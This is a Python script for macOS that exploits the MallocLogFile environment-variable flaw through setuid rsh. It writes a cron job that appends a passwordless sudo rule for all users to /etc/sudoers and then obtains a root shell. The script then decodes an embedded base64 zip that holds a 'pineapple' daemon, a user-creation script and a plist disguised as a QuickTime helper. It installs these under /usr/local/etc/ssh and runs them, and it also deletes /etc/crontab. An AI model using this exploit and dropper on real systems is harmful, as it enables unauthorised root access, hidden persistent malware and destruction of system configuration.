#!/usr/bin/python

from Crypto.Cipher import AES
import subprocess, os, platform, sys, time
import shutil, zipfile, base64

# Cleans up the the crontab file made in exploit
def cleanup():
   #if crontabFile == None:
   rootShell.communicate('rm /etc/crontab; killall cron')
   #else:
      #rootShell.communicate("echo '" + crontabFile.read() + "' > /etc/crontab")

   sys.stderr.write('Done cleaning up!')    


# ***************** MAIN BEGINS *************** #

if os.path.isfile('/etc/crontab'):
   crontabFile = open('/etc/crontab')
else:
   crontabFile = None

# Finished cleanup function

USER = subprocess.check_output('whoami')

sudoer_path = '/etc/sudoers'

# Get size of sudoers file
size = os.path.getsize(sudoer_path)

# Prepare the exploit
env = {}

env['MallocLogFile'] = '/etc/crontab'
env['MallocStackLogging'] = 'yes'
env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers\n\n\n\n\n'

p = os.fork()
if p == 0:
   os.close(1)
   os.close(2)
   os.execve("/usr/bin/rsh",["rsh","localhost"],env)
time.sleep(1)

# Verify success
if "NOPASSWD" not in open("/etc/crontab").read():
   sys.stderr.write("Failed to write to crontab")
   sys.exit(-1)

sys.stderr.write("Done! Waiting for sudoers file to change")

# Wait for crontab to change sudoers file
while os.path.getsize("/etc/sudoers") == size:
  sys.stderr.write(".")  
  time.sleep(1)

sys.stderr.write("\nDone!\n")

rootShell = subprocess.Popen("sudo su", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
newUser = rootShell.communicate('whoami\n')[0]
print newUser
#if crontabFile == None:
os.system('sudo rm /etc/crontab; killall cron')
#else:
   #rootShell.communicate("echo '" + crontabFile.read() + "' > /etc/crontab")
sys.stderr.write('Done cleaning up!')   

if 'root' in newUser:
   sys.stderr.write('Got root\n')
   zipFile = "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"
   os.system('mkdir -p /tmp/pineapple')
   with open('/tmp/pineapple/debug65478392039485.zip', 'w') as f:
      f.write(base64.b64decode(zipFile))
      f.close()
      sys.stderr.write('Wrote out zipfile to /tmp/')
   with zipfile.ZipFile('/tmp/pineapple/debug65478392039485.zip', 'r') as f:
      f.extractall('/tmp/pineapple/')
      f.close()

   os.system("sudo rm /tmp/pineapple/debug65478392039485.zip")
   os.system("sudo mkdir -p /usr/local/etc/ssh")

   os.system("sudo mv /tmp/pineapple/* /usr/local/etc/ssh/")
   os.system("sudo rm /usr/local/etc/ssh/debug65478392039485.zip")

   os.system("sudo chown root:wheel /usr/local/etc/ssh/pineapple.py")
   os.system("sudo chmod +x /usr/local/etc/ssh/pineapple.py")

   os.system("sudo python /usr/local/etc/ssh/pineapple.py")
   
   sys.stderr.write('All done. Pineapple daemon should be running')






